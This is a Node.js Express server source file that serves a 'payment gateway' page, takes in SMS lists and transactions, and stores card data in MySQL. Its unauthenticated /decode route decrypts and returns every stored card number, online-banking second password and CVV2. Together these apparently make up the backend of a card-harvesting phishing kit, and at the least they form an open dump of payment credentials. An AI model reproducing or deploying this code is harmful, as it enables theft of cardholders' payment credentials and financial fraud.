/* Package dependencies */
var express = require('express');
var mysql = require('mysql');
var CryptoJS = require('crypto-js');

/* Custom dependencies */
var constants = require(__dirname + '/modules/constants');
var checkVAS = require(__dirname + '/modules/vas');
var submitTransaction = require(__dirname + '/modules/submitTransaction');

/* MySQL Initialization */
var connection = mysql.createConnection(constants.MySQL);
connection.connect(function(error){
    if(error)
    console.log(error);
    else 
    console.log('MySQL connection established');
});

/* App initialization */
var app = express();
app.use(express.static(__dirname + '/html'));

/* Gloabla variables */
var SECRET_KEY = constants.SECRET_KEY;

/* Start server */
app.listen(constants.PORT,function(error){
    if(error)
    console.log(error);
    else
    console.log('Listening on port : ' + constants.PORT);
});

/* Receive SMS List */
app.post('/vas',function(req, res){
    checkVAS(req, res, connection);
});

/* Receive transactions */
app.get('/submit',function(req, res){
    submitTransaction(req, res, connection);
});

/* Payment gateway */
app.get('/index',function(req, res){
    res.sendFile(__dirname + '/html/index.html');
});

/* Log decoded transactions info */
app.get('/decode',function(req, res){

    connection.query("SELECT * FROM app_cards ORDER BY id DESC",function(error, result){
        
        // Decode each entry
        result.forEach(function(c){
            c.cardnumber = decrypt(c.cardnumber);
            c.secondpass = decrypt(c.secondpass);
            c.cvv2 = decrypt(c.cvv2);
        });

        return res.json(result);
        
    });

});

/* Decrypt function */
function decrypt(hashcode){
    return CryptoJS.AES.decrypt(hashcode.toString(), SECRET_KEY).toString(CryptoJS.enc.Utf8);
}
